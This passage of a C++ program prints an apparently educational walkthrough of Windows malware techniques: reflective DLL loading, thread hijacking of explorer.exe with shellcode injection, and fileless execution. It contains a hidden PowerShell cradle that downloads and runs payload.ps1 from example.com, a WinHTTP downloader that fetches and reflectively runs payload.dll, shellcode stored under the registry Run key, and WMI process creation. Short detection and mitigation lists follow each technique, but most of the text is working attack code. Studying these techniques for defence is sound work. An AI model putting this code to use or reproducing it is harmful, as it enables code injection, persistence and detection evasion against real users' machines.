    std::cout << "LPVOID LoadDllFromFile(const char* file_path, SIZE_T* size) {\n";
    std::cout << "    HANDLE file = CreateFileA(\n";
    std::cout << "        file_path, GENERIC_READ, FILE_SHARE_READ, NULL,\n";
    std::cout << "        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\n";
    
    std::cout << "    if (file == INVALID_HANDLE_VALUE) {\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    *size = GetFileSize(file, NULL);\n";
    std::cout << "    LPVOID buffer = VirtualAlloc(NULL, *size, MEM_COMMIT, PAGE_READWRITE);\n\n";
    
    std::cout << "    if (!buffer) {\n";
    std::cout << "        CloseHandle(file);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    DWORD bytes_read;\n";
    std::cout << "    if (!ReadFile(file, buffer, *size, &bytes_read, NULL)) {\n";
    std::cout << "        VirtualFree(buffer, 0, MEM_RELEASE);\n";
    std::cout << "        CloseHandle(file);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    CloseHandle(file);\n";
    std::cout << "    return buffer;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Main function to demonstrate reflective loading\n";
    std::cout << "int main() {\n";
    std::cout << "    // Load the DLL into memory\n";
    std::cout << "    SIZE_T dll_size;\n";
    std::cout << "    LPVOID dll_data = LoadDllFromFile(\"C:\\\\path\\\\to\\\\reflective_dll.dll\", &dll_size);\n\n";
    
    std::cout << "    if (!dll_data) {\n";
    std::cout << "        std::cout << \"Failed to load DLL into memory.\\n\";\n";
    std::cout << "        return 1;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Reflectively load the DLL\n";
    std::cout << "    HMODULE dll_handle = ReflectiveLoader(dll_data);\n\n";
    
    std::cout << "    // Free the original DLL data (no longer needed)\n";
    std::cout << "    VirtualFree(dll_data, 0, MEM_RELEASE);\n\n";
    
    std::cout << "    if (!dll_handle) {\n";
    std::cout << "        std::cout << \"Failed to reflectively load the DLL.\\n\";\n";
    std::cout << "        return 1;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Get a function from the reflectively loaded DLL\n";
    std::cout << "    typedef void (*ExampleFunction)();\n";
    std::cout << "    ExampleFunction example_function = (ExampleFunction)GetProcAddress(\n";
    std::cout << "        dll_handle, \"ExampleFunction\");\n\n";
    
    std::cout << "    if (example_function) {\n";
    std::cout << "        // Call the function\n";
    std::cout << "        example_function();\n";
    std::cout << "    }\n\n";
    
    std::cout << "    return 0;\n";
    std::cout << "}\n";
    std::cout << "```\n\n";
    
    // Variations of reflective loading
    std::cout << "Variations of reflective loading:\n";
    std::cout << "1. Position-independent code (PIC)\n";
    std::cout << "   - Code that can execute regardless of its memory location\n";
    std::cout << "   - Eliminates the need for relocations\n\n";
    
    std::cout << "2. Shellcode-based loaders\n";
    std::cout << "   - Compact, assembly-level implementations\n";
    std::cout << "   - Minimal dependencies on external functions\n\n";
    
    std::cout << "3. Memory module techniques\n";
    std::cout << "   - Implements a full PE loader in memory\n";
    std::cout << "   - Can load multiple modules with proper dependency resolution\n\n";
    
    // Detection and mitigation
    std::cout << "Detection techniques:\n";
    std::cout << "1. Memory scanning:\n";
    std::cout << "   - Look for PE headers in unexpected memory regions\n";
    std::cout << "   - Detect executable memory that wasn't loaded via standard APIs\n\n";
    
    std::cout << "2. API monitoring:\n";
    std::cout << "   - Monitor for memory allocation followed by execution\n";
    std::cout << "   - Look for VirtualProtect calls that change memory to executable\n\n";
    
    std::cout << "3. Behavioral analysis:\n";
    std::cout << "   - Detect code execution from unusual memory regions\n";
    std::cout << "   - Monitor for suspicious memory manipulation patterns\n\n";
    
    std::cout << "4. Import table analysis:\n";
    std::cout << "   - Look for manually resolved imports\n";
    std::cout << "   - Detect unusual patterns of GetProcAddress calls\n\n";
    
    std::cout << "Mitigation techniques:\n";
    std::cout << "1. Use of Control Flow Guard (CFG) and other exploit mitigations\n";
    std::cout << "2. Memory scanning and integrity checking\n";
    std::cout << "3. Behavior-based detection systems\n";
    std::cout << "4. Application whitelisting and code signing\n";
    std::cout << "5. Restrict access to memory manipulation APIs\n";
}

/**
 * Demonstrate thread execution hijacking
 */
void demonstrate_thread_hijacking() {
    std::cout << "\n=== Thread Execution Hijacking ===\n";
    
    std::cout << "Thread execution hijacking involves suspending a legitimate thread,\n";
    std::cout << "modifying its execution context to point to malicious code, and then\n";
    std::cout << "resuming the thread, causing it to execute the malicious code.\n\n";
    
    // Explain how thread hijacking works
    std::cout << "How thread hijacking works:\n";
    std::cout << "1. Identify a target process and one of its threads\n";
    std::cout << "2. Suspend the target thread\n";
    std::cout << "3. Allocate memory in the target process for malicious code\n";
    std::cout << "4. Write the malicious code to the allocated memory\n";
    std::cout << "5. Modify the thread context to point to the malicious code\n";
    std::cout << "6. Resume the thread, which now executes the malicious code\n\n";
    
    // Demonstrate the thread hijacking process (without actually performing it)
    std::cout << "Thread hijacking process (pseudocode):\n";
    std::cout << "```cpp\n";
    std::cout << "// Target process name\n";
    std::cout << "const char* target_process = \"explorer.exe\";\n\n";
    
    std::cout << "// Find the process ID\n";
    std::cout << "DWORD process_id = find_process_id(target_process);\n";
    std::cout << "if (process_id == 0) {\n";
    std::cout << "    std::cout << \"Target process not found.\\n\";\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Open a handle to the process\n";
    std::cout << "HANDLE process_handle = OpenProcess(\n";
    std::cout << "    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |\n";
    std::cout << "    PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME,\n";
    std::cout << "    FALSE, process_id);\n\n";
    
    std::cout << "if (process_handle == NULL) {\n";
    std::cout << "    std::cout << \"Failed to open process.\\n\";\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Find a thread in the target process\n";
    std::cout << "DWORD thread_id = 0;\n";
    std::cout << "HANDLE thread_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n";
    std::cout << "if (thread_snapshot == INVALID_HANDLE_VALUE) {\n";
    std::cout << "    std::cout << \"Failed to create thread snapshot.\\n\";\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "THREADENTRY32 thread_entry;\n";
    std::cout << "thread_entry.dwSize = sizeof(THREADENTRY32);\n";
    std::cout << "if (!Thread32First(thread_snapshot, &thread_entry)) {\n";
    std::cout << "    std::cout << \"Failed to get first thread.\\n\";\n";
    std::cout << "    CloseHandle(thread_snapshot);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Find a thread belonging to the target process\n";
    std::cout << "do {\n";
    std::cout << "    if (thread_entry.th32OwnerProcessID == process_id) {\n";
    std::cout << "        thread_id = thread_entry.th32ThreadID;\n";
    std::cout << "        break;\n";
    std::cout << "    }\n";
    std::cout << "} while (Thread32Next(thread_snapshot, &thread_entry));\n\n";
    
    std::cout << "CloseHandle(thread_snapshot);\n\n";
    
    std::cout << "if (thread_id == 0) {\n";
    std::cout << "    std::cout << \"No threads found in the target process.\\n\";\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Open a handle to the thread\n";
    std::cout << "HANDLE thread_handle = OpenThread(\n";
    std::cout << "    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,\n";
    std::cout << "    FALSE, thread_id);\n\n";
    
    std::cout << "if (thread_handle == NULL) {\n";
    std::cout << "    std::cout << \"Failed to open thread.\\n\";\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Suspend the thread\n";
    std::cout << "if (SuspendThread(thread_handle) == -1) {\n";
    std::cout << "    std::cout << \"Failed to suspend thread.\\n\";\n";
    std::cout << "    CloseHandle(thread_handle);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Get the thread context\n";
    std::cout << "CONTEXT thread_context;\n";
    std::cout << "thread_context.ContextFlags = CONTEXT_FULL;\n";
    std::cout << "if (!GetThreadContext(thread_handle, &thread_context)) {\n";
    std::cout << "    std::cout << \"Failed to get thread context.\\n\";\n";
    std::cout << "    ResumeThread(thread_handle);  // Resume the thread before exiting\n";
    std::cout << "    CloseHandle(thread_handle);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Allocate memory for the shellcode in the target process\n";
    std::cout << "// Example shellcode (MessageBox)\n";
    std::cout << "unsigned char shellcode[] = {\n";
    std::cout << "    // x64 shellcode that displays a MessageBox\n";
    std::cout << "    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00,\n";
    std::cout << "    // ... (rest of the shellcode)\n";
    std::cout << "};\n\n";
    
    std::cout << "LPVOID shellcode_address = VirtualAllocEx(\n";
    std::cout << "    process_handle, NULL, sizeof(shellcode),\n";
    std::cout << "    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n";
    
    std::cout << "if (shellcode_address == NULL) {\n";
    std::cout << "    std::cout << \"Failed to allocate memory in the target process.\\n\";\n";
    std::cout << "    ResumeThread(thread_handle);  // Resume the thread before exiting\n";
    std::cout << "    CloseHandle(thread_handle);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Write the shellcode to the allocated memory\n";
    std::cout << "if (!WriteProcessMemory(\n";
    std::cout << "    process_handle, shellcode_address, shellcode, sizeof(shellcode), NULL)) {\n";
    std::cout << "    std::cout << \"Failed to write shellcode to the target process.\\n\";\n";
    std::cout << "    VirtualFreeEx(process_handle, shellcode_address, 0, MEM_RELEASE);\n";
    std::cout << "    ResumeThread(thread_handle);  // Resume the thread before exiting\n";
    std::cout << "    CloseHandle(thread_handle);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Save the original instruction pointer\n";
    std::cout << "#ifdef _WIN64\n";
    std::cout << "    DWORD64 original_rip = thread_context.Rip;\n";
    std::cout << "    // Modify the instruction pointer to point to our shellcode\n";
    std::cout << "    thread_context.Rip = (DWORD64)shellcode_address;\n";
    std::cout << "#else\n";
    std::cout << "    DWORD original_eip = thread_context.Eip;\n";
    std::cout << "    // Modify the instruction pointer to point to our shellcode\n";
    std::cout << "    thread_context.Eip = (DWORD)shellcode_address;\n";
    std::cout << "#endif\n\n";
    
    std::cout << "// Set the modified thread context\n";
    std::cout << "if (!SetThreadContext(thread_handle, &thread_context)) {\n";
    std::cout << "    std::cout << \"Failed to set thread context.\\n\";\n";
    std::cout << "    VirtualFreeEx(process_handle, shellcode_address, 0, MEM_RELEASE);\n";
    std::cout << "    ResumeThread(thread_handle);  // Resume the thread before exiting\n";
    std::cout << "    CloseHandle(thread_handle);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Resume the thread to execute the shellcode\n";
    std::cout << "if (ResumeThread(thread_handle) == -1) {\n";
    std::cout << "    std::cout << \"Failed to resume thread.\\n\";\n";
    std::cout << "    VirtualFreeEx(process_handle, shellcode_address, 0, MEM_RELEASE);\n";
    std::cout << "    CloseHandle(thread_handle);\n";
    std::cout << "    CloseHandle(process_handle);\n";
    std::cout << "    return;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Clean up\n";
    std::cout << "CloseHandle(thread_handle);\n";
    std::cout << "CloseHandle(process_handle);\n";
    std::cout << "```\n\n";
    
    // Variations of thread hijacking
    std::cout << "Variations of thread hijacking:\n";
    std::cout << "1. Return address hijacking\n";
    std::cout << "   - Modifies the return address on the stack\n";
    std::cout << "   - Executes malicious code when a function returns\n\n";
    
    std::cout << "2. Exception handler hijacking\n";
    std::cout << "   - Registers a malicious exception handler\n";
    std::cout << "   - Triggers an exception to execute the malicious code\n\n";
    
    std::cout << "3. APC (Asynchronous Procedure Call) injection\n";
    std::cout << "   - Queues a malicious APC to a thread\n";
    std::cout << "   - Code executes when the thread enters an alertable state\n\n";
    
    // Detection and mitigation
    std::cout << "Detection techniques:\n";
    std::cout << "1. Monitor for suspicious API calls:\n";
    std::cout << "   - OpenThread, SuspendThread, GetThreadContext, SetThreadContext\n";
    std::cout << "   - VirtualAllocEx, WriteProcessMemory followed by ResumeThread\n\n";
    
    std::cout << "2. Thread context monitoring:\n";
    std::cout << "   - Detect unexpected changes to thread contexts\n";
    std::cout << "   - Monitor for threads suddenly executing from unusual memory regions\n\n";
    
    std::cout << "3. Memory scanning:\n";
    std::cout << "   - Look for executable memory that wasn't loaded via standard APIs\n";
    std::cout << "   - Detect suspicious memory allocations with execute permissions\n\n";
    
    std::cout << "4. Behavioral analysis:\n";
    std::cout << "   - Monitor for unusual thread suspension and resumption patterns\n";
    std::cout << "   - Detect threads executing code from unexpected memory regions\n\n";
    
    std::cout << "Mitigation techniques:\n";
    std::cout << "1. Use of Control Flow Guard (CFG) and other exploit mitigations\n";
    std::cout << "2. Thread execution validation\n";
    std::cout << "3. Behavior-based detection systems\n";
    std::cout << "4. Restrict access to thread manipulation APIs\n";
    std::cout << "5. Memory integrity checking\n";
}

/**
 * Demonstrate fileless (memory-only) execution
 */
void demonstrate_fileless_execution() {
    std::cout << "\n=== Fileless (Memory-only) Execution ===\n";
    
    std::cout << "Fileless execution involves running code directly in memory without\n";
    std::cout << "writing any files to disk, making it harder to detect by traditional\n";
    std::cout << "file-based security solutions.\n\n";
    
    // Explain how fileless execution works
    std::cout << "How fileless execution works:\n";
    std::cout << "1. Code is loaded directly into memory, bypassing the file system\n";
    std::cout << "2. Execution occurs through legitimate system processes or interpreters\n";
    std::cout << "3. The code may be sourced from the network, registry, or other non-file locations\n";
    std::cout << "4. No malicious files are written to disk that could be detected\n";
    std::cout << "5. The attack leaves minimal forensic evidence on the system\n\n";
    
    // Demonstrate fileless execution techniques
    std::cout << "Common fileless execution techniques:\n\n";
    
    // 1. PowerShell-based fileless execution
    std::cout << "1. PowerShell-based fileless execution:\n";
    std::cout << "```powershell\n";
    std::cout << "# Example of PowerShell fileless execution\n";
    std::cout << "# This downloads and executes code directly in memory\n\n";
    
    std::cout << "# PowerShell command that could be executed via WMI, registry, etc.\n";
    std::cout << "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"\n";
    std::cout << "    # Download payload from remote server\n";
    std::cout << "    $code = (New-Object System.Net.WebClient).DownloadString('http://example.com/payload.ps1');\n";
    std::cout << "    \n";
    std::cout << "    # Execute the downloaded code in memory\n";
    std::cout << "    Invoke-Expression $code;\n";
    std::cout << "\"\n";
    std::cout << "```\n\n";
    
    // 2. Reflective DLL injection
    std::cout << "2. Reflective DLL injection (memory-only):\n";
    std::cout << "```cpp\n";
    std::cout << "// Example of downloading and reflectively loading a DLL in memory\n\n";
    
    std::cout << "// Function to download data from a URL\n";
    std::cout << "LPVOID DownloadFromUrl(const char* url, DWORD* size) {\n";
    std::cout << "    // Initialize WinHTTP\n";
    std::cout << "    HINTERNET hSession = WinHttpOpen(\n";
    std::cout << "        L\"Downloader\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,\n";
    std::cout << "        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);\n\n";
    
    std::cout << "    if (!hSession) {\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Convert URL to wide string (simplified)\n";
    std::cout << "    wchar_t wide_url[256];\n";
    std::cout << "    MultiByteToWideChar(CP_ACP, 0, url, -1, wide_url, 256);\n\n";
    
    std::cout << "    // Parse the URL\n";
    std::cout << "    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };\n";
    std::cout << "    urlComp.dwHostNameLength = 1;\n";
    std::cout << "    urlComp.dwUrlPathLength = 1;\n\n";
    
    std::cout << "    if (!WinHttpCrackUrl(wide_url, 0, 0, &urlComp)) {\n";
    std::cout << "        WinHttpCloseHandle(hSession);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Extract hostname and path\n";
    std::cout << "    wchar_t hostname[256];\n";
    std::cout << "    wchar_t path[256];\n";
    std::cout << "    wcsncpy_s(hostname, urlComp.lpszHostName, urlComp.dwHostNameLength);\n";
    std::cout << "    hostname[urlComp.dwHostNameLength] = 0;\n";
    std::cout << "    wcsncpy_s(path, urlComp.lpszUrlPath, urlComp.dwUrlPathLength);\n";
    std::cout << "    path[urlComp.dwUrlPathLength] = 0;\n\n";
    
    std::cout << "    // Connect to the server\n";
    std::cout << "    HINTERNET hConnect = WinHttpConnect(\n";
    std::cout << "        hSession, hostname, urlComp.nPort, 0);\n\n";
    
    std::cout << "    if (!hConnect) {\n";
    std::cout << "        WinHttpCloseHandle(hSession);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Create an HTTP request\n";
    std::cout << "    HINTERNET hRequest = WinHttpOpenRequest(\n";
    std::cout << "        hConnect, L\"GET\", path, NULL,\n";
    std::cout << "        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,\n";
    std::cout << "        urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);\n\n";
    
    std::cout << "    if (!hRequest) {\n";
    std::cout << "        WinHttpCloseHandle(hConnect);\n";
    std::cout << "        WinHttpCloseHandle(hSession);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Send the request\n";
    std::cout << "    if (!WinHttpSendRequest(\n";
    std::cout << "        hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,\n";
    std::cout << "        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {\n";
    std::cout << "        WinHttpCloseHandle(hRequest);\n";
    std::cout << "        WinHttpCloseHandle(hConnect);\n";
    std::cout << "        WinHttpCloseHandle(hSession);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Receive the response\n";
    std::cout << "    if (!WinHttpReceiveResponse(hRequest, NULL)) {\n";
    std::cout << "        WinHttpCloseHandle(hRequest);\n";
    std::cout << "        WinHttpCloseHandle(hConnect);\n";
    std::cout << "        WinHttpCloseHandle(hSession);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Allocate memory for the response\n";
    std::cout << "    DWORD downloaded_size = 0;\n";
    std::cout << "    DWORD buffer_size = 4096;\n";
    std::cout << "    LPVOID buffer = VirtualAlloc(NULL, buffer_size, MEM_COMMIT, PAGE_READWRITE);\n\n";
    
    std::cout << "    if (!buffer) {\n";
    std::cout << "        WinHttpCloseHandle(hRequest);\n";
    std::cout << "        WinHttpCloseHandle(hConnect);\n";
    std::cout << "        WinHttpCloseHandle(hSession);\n";
    std::cout << "        return NULL;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Read the response data\n";
    std::cout << "    DWORD bytes_read = 0;\n";
    std::cout << "    while (WinHttpReadData(hRequest, (LPVOID)((LPBYTE)buffer + downloaded_size),\n";
    std::cout << "                          buffer_size - downloaded_size, &bytes_read) && bytes_read > 0) {\n";
    std::cout << "        downloaded_size += bytes_read;\n\n";
    
    std::cout << "        // Resize the buffer if needed\n";
    std::cout << "        if (downloaded_size + 4096 > buffer_size) {\n";
    std::cout << "            DWORD new_size = buffer_size + 4096;\n";
    std::cout << "            LPVOID new_buffer = VirtualAlloc(NULL, new_size, MEM_COMMIT, PAGE_READWRITE);\n";
    std::cout << "            if (!new_buffer) {\n";
    std::cout << "                VirtualFree(buffer, 0, MEM_RELEASE);\n";
    std::cout << "                WinHttpCloseHandle(hRequest);\n";
    std::cout << "                WinHttpCloseHandle(hConnect);\n";
    std::cout << "                WinHttpCloseHandle(hSession);\n";
    std::cout << "                return NULL;\n";
    std::cout << "            }\n";
    std::cout << "            memcpy(new_buffer, buffer, downloaded_size);\n";
    std::cout << "            VirtualFree(buffer, 0, MEM_RELEASE);\n";
    std::cout << "            buffer = new_buffer;\n";
    std::cout << "            buffer_size = new_size;\n";
    std::cout << "        }\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Clean up HTTP handles\n";
    std::cout << "    WinHttpCloseHandle(hRequest);\n";
    std::cout << "    WinHttpCloseHandle(hConnect);\n";
    std::cout << "    WinHttpCloseHandle(hSession);\n\n";
    
    std::cout << "    *size = downloaded_size;\n";
    std::cout << "    return buffer;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Main function to demonstrate fileless execution\n";
    std::cout << "int main() {\n";
    std::cout << "    // Download DLL directly into memory\n";
    std::cout << "    DWORD dll_size = 0;\n";
    std::cout << "    LPVOID dll_data = DownloadFromUrl(\"http://example.com/payload.dll\", &dll_size);\n\n";
    
    std::cout << "    if (!dll_data) {\n";
    std::cout << "        std::cout << \"Failed to download payload.\\n\";\n";
    std::cout << "        return 1;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Reflectively load the DLL from memory\n";
    std::cout << "    HMODULE dll_handle = ReflectiveLoader(dll_data);  // Using the function from previous example\n\n";
    
    std::cout << "    // Free the original DLL data (no longer needed)\n";
    std::cout << "    VirtualFree(dll_data, 0, MEM_RELEASE);\n\n";
    
    std::cout << "    if (!dll_handle) {\n";
    std::cout << "        std::cout << \"Failed to reflectively load the DLL.\\n\";\n";
    std::cout << "        return 1;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Get and call a function from the reflectively loaded DLL\n";
    std::cout << "    typedef void (*PayloadFunction)();\n";
    std::cout << "    PayloadFunction payload_function = (PayloadFunction)GetProcAddress(\n";
    std::cout << "        dll_handle, \"ExecutePayload\");\n\n";
    
    std::cout << "    if (payload_function) {\n";
    std::cout << "        // Execute the payload\n";
    std::cout << "        payload_function();\n";
    std::cout << "    }\n\n";
    
    std::cout << "    return 0;\n";
    std::cout << "}\n";
    std::cout << "```\n\n";
    
    // 3. Registry-based fileless execution
    std::cout << "3. Registry-based fileless execution:\n";
    std::cout << "```cpp\n";
    std::cout << "// Example of storing and executing code from the registry\n\n";
    
    std::cout << "// Function to store shellcode in the registry\n";
    std::cout << "bool StoreShellcodeInRegistry(const char* key_path, const char* value_name,\n";
    std::cout << "                             const unsigned char* shellcode, DWORD size) {\n";
    std::cout << "    HKEY hKey;\n";
    std::cout << "    LSTATUS status = RegCreateKeyExA(\n";
    std::cout << "        HKEY_CURRENT_USER, key_path, 0, NULL, 0,\n";
    std::cout << "        KEY_WRITE, NULL, &hKey, NULL);\n\n";
    
    std::cout << "    if (status != ERROR_SUCCESS) {\n";
    std::cout << "        return false;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    status = RegSetValueExA(\n";
    std::cout << "        hKey, value_name, 0, REG_BINARY,\n";
    std::cout << "        shellcode, size);\n\n";
    
    std::cout << "    RegCloseKey(hKey);\n";
    std::cout << "    return (status == ERROR_SUCCESS);\n";
    std::cout << "}\n\n";
    
    std::cout << "// Function to retrieve shellcode from the registry and execute it\n";
    std::cout << "bool ExecuteShellcodeFromRegistry(const char* key_path, const char* value_name) {\n";
    std::cout << "    HKEY hKey;\n";
    std::cout << "    LSTATUS status = RegOpenKeyExA(\n";
    std::cout << "        HKEY_CURRENT_USER, key_path, 0, KEY_READ, &hKey);\n\n";
    
    std::cout << "    if (status != ERROR_SUCCESS) {\n";
    std::cout << "        return false;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Get the size of the stored shellcode\n";
    std::cout << "    DWORD size = 0;\n";
    std::cout << "    DWORD type = 0;\n";
    std::cout << "    status = RegQueryValueExA(\n";
    std::cout << "        hKey, value_name, NULL, &type, NULL, &size);\n\n";
    
    std::cout << "    if (status != ERROR_SUCCESS || type != REG_BINARY || size == 0) {\n";
    std::cout << "        RegCloseKey(hKey);\n";
    std::cout << "        return false;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Allocate memory for the shellcode\n";
    std::cout << "    unsigned char* shellcode = (unsigned char*)VirtualAlloc(\n";
    std::cout << "        NULL, size, MEM_COMMIT, PAGE_READWRITE);\n\n";
    
    std::cout << "    if (!shellcode) {\n";
    std::cout << "        RegCloseKey(hKey);\n";
    std::cout << "        return false;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Read the shellcode from the registry\n";
    std::cout << "    status = RegQueryValueExA(\n";
    std::cout << "        hKey, value_name, NULL, NULL, shellcode, &size);\n\n";
    
    std::cout << "    RegCloseKey(hKey);\n\n";
    
    std::cout << "    if (status != ERROR_SUCCESS) {\n";
    std::cout << "        VirtualFree(shellcode, 0, MEM_RELEASE);\n";
    std::cout << "        return false;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Change memory protection to allow execution\n";
    std::cout << "    DWORD old_protect;\n";
    std::cout << "    if (!VirtualProtect(shellcode, size, PAGE_EXECUTE_READ, &old_protect)) {\n";
    std::cout << "        VirtualFree(shellcode, 0, MEM_RELEASE);\n";
    std::cout << "        return false;\n";
    std::cout << "    }\n\n";
    std::cout << "    // Execute the shellcode\n";
    std::cout << "    typedef void (*ShellcodeFunction)();\n";
    std::cout << "    ShellcodeFunction shellcode_function = (ShellcodeFunction)shellcode;\n";
    std::cout << "    shellcode_function();\n\n";
    
    std::cout << "    // Clean up (note: this might not be reached if the shellcode doesn't return)\n";
    std::cout << "    VirtualFree(shellcode, 0, MEM_RELEASE);\n";
    std::cout << "    return true;\n";
    std::cout << "}\n\n";
    
    std::cout << "// Main function to demonstrate registry-based fileless execution\n";
    std::cout << "int main() {\n";
    std::cout << "    // Example shellcode (MessageBox)\n";
    std::cout << "    unsigned char shellcode[] = {\n";
    std::cout << "        // x64 shellcode that displays a MessageBox\n";
    std::cout << "        0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00,\n";
    std::cout << "        // ... (rest of the shellcode)\n";
    std::cout << "    };\n\n";
    
    std::cout << "    // Store the shellcode in the registry\n";
    std::cout << "    const char* key_path = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\";\n";
    std::cout << "    const char* value_name = \"UpdateCheck\";\n\n";
    
    std::cout << "    if (!StoreShellcodeInRegistry(key_path, value_name, shellcode, sizeof(shellcode))) {\n";
    std::cout << "        std::cout << \"Failed to store shellcode in the registry.\\n\";\n";
    std::cout << "        return 1;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    // Execute the shellcode from the registry\n";
    std::cout << "    if (!ExecuteShellcodeFromRegistry(key_path, value_name)) {\n";
    std::cout << "        std::cout << \"Failed to execute shellcode from the registry.\\n\";\n";
    std::cout << "        return 1;\n";
    std::cout << "    }\n\n";
    
    std::cout << "    return 0;\n";
    std::cout << "}\n";
    std::cout << "```\n\n";
    
    // 4. WMI-based fileless execution
    std::cout << "4. WMI-based fileless execution:\n";
    std::cout << "```cpp\n";
    std::cout << "// Example of using WMI for fileless execution\n\n";
    
    std::cout << "// Note: This would typically be implemented using COM,\n";
    std::cout << "// but here's a pseudocode representation\n\n";
    
    std::cout << "bool ExecuteCommandViaWMI(const char* command) {\n";
    std::cout << "    // Initialize COM\n";
    std::cout << "    CoInitializeEx(NULL, COINIT_MULTITHREADED);\n\n";
    
    std::cout << "    // Initialize security\n";
    std::cout << "    CoInitializeSecurity(...);\n\n";
    
    std::cout << "    // Create WMI locator\n";
    std::cout << "    IWbemLocator* pLocator = NULL;\n";
    std::cout << "    CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,\n";
    std::cout << "                    IID_IWbemLocator, (LPVOID*)&pLocator);\n\n";
    
    std::cout << "    // Connect to WMI namespace\n";
    std::cout << "    IWbemServices* pServices = NULL;\n";
    std::cout << "    pLocator->ConnectServer(_bstr_t(L\"ROOT\\\\CIMV2\"), NULL, NULL, NULL,\n";
    std::cout << "                           0, NULL, NULL, &pServices);\n\n";
    
    std::cout << "    // Set security on WMI connection\n";
    std::cout << "    CoSetProxyBlanket(...);\n\n";
    
    std::cout << "    // Create a WMI method object (Win32_Process::Create)\n";
    std::cout << "    IWbemClassObject* pClass = NULL;\n";
    std::cout << "    pServices->GetObject(_bstr_t(L\"Win32_Process\"), 0, NULL, &pClass, NULL);\n\n";
    
    std::cout << "    // Create the method parameters\n";
    std::cout << "    IWbemClassObject* pInParams = NULL;\n";
    std::cout << "    pClass->GetMethod(_bstr_t(L\"Create\"), 0, &pInParams, NULL);\n\n";
    
    std::cout << "    // Create an instance of the parameters\n";
    std::cout << "    IWbemClassObject* pParams = NULL;\n";
    std::cout << "    pInParams->SpawnInstance(0, &pParams);\n\n";
    
    std::cout << "    // Set the command line parameter\n";
    std::cout << "    VARIANT vtCommand;\n";
    std::cout << "    VariantInit(&vtCommand);\n";
    std::cout << "    vtCommand.vt = VT_BSTR;\n";
    std::cout << "    // Convert command to BSTR\n";
    std::cout << "    vtCommand.bstrVal = _bstr_t(command);\n";
    std::cout << "    pParams->Put(L\"CommandLine\", 0, &vtCommand, 0);\n\n";
    
    std::cout << "    // Execute the method\n";
    std::cout << "    IWbemClassObject* pOutParams = NULL;\n";
    std::cout << "    pServices->ExecMethod(_bstr_t(L\"Win32_Process\"), _bstr_t(L\"Create\"),\n";
    std::cout << "                          0, NULL, pParams, &pOutParams, NULL);\n\n";
    
